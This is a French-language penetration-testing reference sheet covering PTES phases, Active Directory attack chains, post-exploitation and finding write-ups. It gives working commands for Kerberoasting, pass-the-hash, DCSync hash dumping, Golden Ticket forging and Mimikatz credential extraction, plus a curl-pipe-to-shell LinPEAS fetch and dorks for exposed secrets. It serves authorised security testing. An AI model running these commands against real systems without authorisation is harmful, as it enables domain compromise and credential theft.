# Méthodologies et chemins d'attaque — Référence

## Phases d'un test d'intrusion (PTES)
- 1. Recon passive : OSINT, whois, subdomains (crt.sh), Google dorks, shodan
- 2. Recon active : nmap -sV -sC, ffuf, énumération HTTP (headers, robots, .git, backups)
- 3. Exploitation : valider chaque vulnérabilité avec une preuve d'impact
- 4. Post-exploitation : privesc, pivot, persistence (si contrat), collecte de preuves
- 5. Reporting : description + impact + reproduction + CVSS vectorisé + remédiation

## Active Directory — Kerberoasting
- Demander un TGS pour un compte de service, cracker le hash hors-ligne
- GetUserSPNs.py domain/user:pass -dc-ip IP -request
- hashcat -m 13100 kerberoast.txt rockyou.txt

## Active Directory — AS-REP Roasting
- Comptes sans pré-auth Kerberos requise
- GetNPUsers.py domain/ -usersfile users.txt -dc-ip IP
- hashcat -m 18200 asrep.txt rockyou.txt

## Active Directory — Pass-the-Hash et Pass-the-Ticket
- PtH : utiliser le hash NTLM sans le casser
  - psexec.py domain/user@target -hashes :NTLMHASH
  - crackmapexec smb 192.168.1.0/24 -u admin -H NTLMHASH
- PtT : réutiliser un ticket Kerberos volé
  - psexec.py -k -no-pass domain/user@target

## Active Directory — DCSync
- Répliquer les hashs depuis un DC (droits élevés requis)
- secretsdump.py domain/user:pass@DC -just-dc

## Active Directory — Délégations (constrained/unconstrained)
- findDelegation.py domain/user:pass -dc-ip IP
- getST.py -impersonate admin domain/user:pass -spn cifs/target

## Active Directory — Golden Ticket et BloodHound
- Golden Ticket : forger un TGT avec le hash krbtgt (post-compromission totale)
  - ticketer.py -nthash KRB_HASH -domain-sid SID -domain domain fakeadmin
- BloodHound : cartographier les chemins d'élévation
  - bloodhound-python -d domain -u user -p pass -ns IP -c All

## Windows — post-exploitation
- Mimikatz : privilege::debug, sekurlsa::logonpasswords, lsadump::sam
- Token impersonation (msf) : getsystem, steal_token
- UAC bypass : fodhelper.exe, eventvwr.exe (registry)
- Sauvegarder les preuves : captures, fichiers, hashs avec contexte (machine, date, commande)

## Linux — post-exploitation
- LinPEAS : curl -L https://github.com/peass-ng/PEASS-ng/.../linpeas.sh | sh
- Chisel pour pivoter, ssh -L pour forwarder les ports
- Ne jamais modifier le système cible sans autorisation explicite

## Reporting — structure d'un finding pro
- Titre : action + objet (ex : "Injection SQL dans le paramètre id de /search.php")
- Sévérité : score CVSS 3.1 avec vecteur complet + justification
- Description : 2-3 phrases, contexte technique
- Preuve : requête + réponse, capture horodatée, commande reproductible
- Impact : ce qu'un attaquant peut réellement faire
- Remédiation : correction précise (code si possible) + référence (OWASP/CWE)
- Priorité : basée sur l'exposition réelle, pas seulement le CVSS brut

## Google dorks utiles
- site:target.com filetype:env
- site:target.com inurl:admin
- site:target.com ext:sql | ext:bak | ext:log
- "target.com" "password" filetype:xlsx
- inurl:php?id= site:target.com